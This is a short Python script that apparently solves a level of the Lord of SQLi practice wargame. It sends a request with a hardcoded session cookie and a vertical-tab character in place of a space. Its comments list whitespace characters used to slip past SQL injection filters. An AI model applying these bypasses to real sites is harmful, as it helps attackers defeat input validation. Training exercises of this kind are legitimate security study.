import requests

url = "http://los.rubiya.kr/giant_18a08c3be1d1753de0cb157703f75a5e.php"

headers = {
    "Cookie": "PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
}

# space bypass %20 %0a %0b %0c %0d /**/ 0x00....
# This Challege %0b %0c 
# chr(11) -> \x0b
# chr(12) -> \x0c  
params = {
    "shit":chr(11)
          #chr(12)
}

res = requests.get(url, headers=headers, params=params)
print res.content


 


